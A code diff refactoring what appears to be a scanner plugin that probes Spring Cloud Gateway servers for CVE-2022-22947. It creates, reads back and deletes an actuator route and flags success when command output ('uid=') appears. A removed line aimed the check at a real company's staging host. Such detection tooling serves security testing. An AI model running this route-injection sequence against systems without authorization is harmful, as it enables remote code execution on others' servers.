@@ -8,13 +8,17 @@
 """
 import random
 import requests
-from utils.custom_headers import USER_AGENTS
+from json import JSONDecodeError
+from utils.custom_headers import USER_AGENTS, TIMEOUT
+from colorama import Fore
 from utils.logging_config import configure_logger
 logger = configure_logger(__name__)
 requests.packages.urllib3.disable_warnings()
 
+CVE_ID = "CVE-2022-22947"
 
-def check(target_url, proxies=None):
+
+def check(url, dns_domain, proxies=None):
     """
     对给定的目标URL检测CVE-2022-22947漏洞。
 
@@ -22,22 +26,14 @@ def check(target_url, proxies=None):
     - target_url: 待检测的目标URL
     - proxies: 代理配置
     """
-    CVE_ID = "CVE-2022-22947"
-    headers1 = {
+    base_headers = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'en',
-        'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'application/json'
+        'User-Agent': random.choice(USER_AGENTS)
     }
-
-    headers2 = {
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept': '*/*',
-        'Accept-Language': 'en',
-        'User-Agent': random.choice(USER_AGENTS),
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
+    json_headers = {**base_headers, 'Content-Type': 'application/json'}
+    form_headers = {**base_headers, 'Content-Type': 'application/x-www-form-urlencoded'}
 
     payload = '''{\r
         "id": "hacktest",\r
@@ -48,61 +44,37 @@ def check(target_url, proxies=None):
         "uri": "http://example.com",\r
         "order": 0\r
     }'''
-    target_url = target_url.rstrip("/")
+    target_url = url.strip("/")
     try:
-        # 发起请求
-        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=headers1, data=payload, verify=False, timeout=10, proxies=proxies)
-
+        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=json_headers, data=payload, verify=False, timeout=TIMEOUT, proxies=proxies)
         if res1.status_code != 201:
-            return False, {
-                "CVE_ID": CVE_ID,
-                "URL": res1.url,
-                "Details": f"未检测到CVE-2022-22947的RCE漏洞"
-            }
-
-        requests.post(target_url + "/actuator/gateway/refresh", headers=headers2, verify=False, timeout=10, proxies=proxies)
-        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=False, timeout=10, proxies=proxies)
-        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=False, timeout=10, proxies=proxies)
-        requests.post(target_url + "/actuator/gateway/refresh", headers=headers2, verify=False, timeout=10, proxies=proxies)
-
-        if res3.status_code == 200:
+            return False, {}
+        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+        requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]", extra={"target": target_url})
+        if res3.status_code == 200 and "uid=" in res3.text:
+            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": res3.url})
             return True, {
                 "CVE_ID": CVE_ID,
                 "URL": res3.url,
                 "Details": f"检测到{CVE_ID}的RCE漏洞",
                 "response": res3.json()
             }
-        else:
-            return False, {
-                "CVE_ID": CVE_ID,
-                "URL": target_url,
-                "Details": f"未检测到{CVE_ID}的RCE漏洞"
-            }
-    except requests.ConnectionError as e:
-        logger.error(f"URL: {target_url} 连接错误：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"连接错误：{e}"
-        }
-
-    except requests.Timeout as e:
-        logger.error(f"URL: {target_url} 请求超时：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"请求超时：{e}"
-        }
-
+        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
+        return False, {}
     except requests.RequestException as e:
-        logger.error(f"URL: {target_url} 请求出错：{e}")
-        return False, {
-            "CVE_ID": CVE_ID,
-            "URL": target_url,
-            "Details": f"请求出错：{e}"
-        }
+        logger.debug(f"[Request Error：{e}]", extra={"target": url})
+        return False, {}
+    except JSONDecodeError as e:
+        logger.error(f"[The response content is not in JSON format：{e}]", extra={"target": url})
+        return False, {}
+    except Exception as e:
+        logger.error(f"[Unknow Error：{e}]", extra={"target": url})
+        return False, {}
 
 
 if __name__ == '__main__':
-    is_vul, res = check("https://nts-sp-xt-stg1.pingan.com/", proxies={})
+    is_vul, res = check("http://localhost:8083/", "", proxies={})
     print(is_vul, res)
